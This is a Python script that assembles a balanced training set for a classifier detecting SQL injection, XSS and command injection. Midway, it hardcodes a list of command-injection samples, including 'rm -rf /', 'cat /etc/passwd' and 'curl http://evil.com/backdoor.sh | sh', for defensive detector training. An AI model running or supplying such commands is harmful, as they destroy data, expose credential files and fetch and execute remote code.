# ML/Preprocessing/extract_and_include.py
import pandas as pd
import os
import sys

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CLEANED_DATA_PATH = os.path.join(BASE_DIR, "Data", "processed", "combined_data_CLEANED.csv")
OUTPUT_PATH = os.path.join(BASE_DIR, "Data", "processed", "balanced_security_dataset_25k.csv")

TOTAL_SIZE = 25000
n_classes = 4
samples_per_class = TOTAL_SIZE // n_classes   # 6250

# Load cleaned data
df = pd.read_csv(CLEANED_DATA_PATH)
print("Loaded cleaned data, rows:", len(df))

# Define columns
CODE_COL = "Sentence"
SQL_COL = "SQLInjection"
XSS_COL = "XSS"
CMD_COL = "CommandInjection"
NORMAL_COL = "Normal"

def get_label(row):
    if row[NORMAL_COL] == 1:
        return 0
    if row[SQL_COL] == 1:
        return 1
    if row[XSS_COL] == 1:
        return 2
    if row[CMD_COL] == 1:
        return 3
    return -1

df["label"] = df.apply(get_label, axis=1)
df = df[df["label"] != -1]

# Sample per class
balanced = []
for label in range(n_classes):
    class_df = df[df["label"] == label]
    if len(class_df) >= samples_per_class:
        sampled = class_df.sample(n=samples_per_class, random_state=42)
    else:
        sampled = class_df
    balanced.append(sampled)

balanced_df = pd.concat(balanced, ignore_index=True)
balanced_df = balanced_df.sample(frac=1, random_state=42).reset_index(drop=True)
balanced_df.drop(columns=["label"], inplace=True)

# Now force‑include the simple examples we added earlier (they are already in the original df,
# but might have been missed in the random sampling). We'll add them manually.
# First, define the simple examples we added (must match exactly).
simple_cmd = [
    "ping -c 4 127.0.0.1", "rm -rf /", "cat /etc/passwd", "ls -la",
    "wget http://evil.com/backdoor.sh", "curl http://evil.com/backdoor.sh | sh",
    "echo 'malicious' >> /etc/passwd", "; ls", "| cat /etc/passwd",
    "& ping -c 4 google.com", "$(id)", "`id`", "ping 8.8.8.8; ls",
    "id; whoami", "| wget http://evil.com/shell.sh"
]
simple_benign = [
    "Hello world", "test input", "normal text", "user name",
    "search term", "comment here", "profile description", "regular data"
]

# Function to check if a payload is already in the balanced dataset
def payload_exists(df, sentence):
    return (df["Sentence"] == sentence).any()

# Add missing command injection examples
for s in simple_cmd:
    if not payload_exists(balanced_df, s):
        # Get the original row from the cleaned data
        original = df[(df["Sentence"] == s) & (df["label"] == 3)]
        if not original.empty:
            balanced_df = pd.concat([balanced_df, original], ignore_index=True)
            print(f"Added missing command injection: {s}")

# Add missing benign examples
for s in simple_benign:
    if not payload_exists(balanced_df, s):
        original = df[(df["Sentence"] == s) & (df["label"] == 0)]
        if not original.empty:
            balanced_df = pd.concat([balanced_df, original], ignore_index=True)
            print(f"Added missing benign: {s}")

# Shuffle again
balanced_df = balanced_df.sample(frac=1, random_state=42).reset_index(drop=True)

# Save
balanced_df.to_csv(OUTPUT_PATH, index=False)
print(f"Final dataset size: {len(balanced_df)}")
print(f"Class distribution after inclusion:")
print(balanced_df[["SQLInjection","XSS","CommandInjection","Normal"]].sum())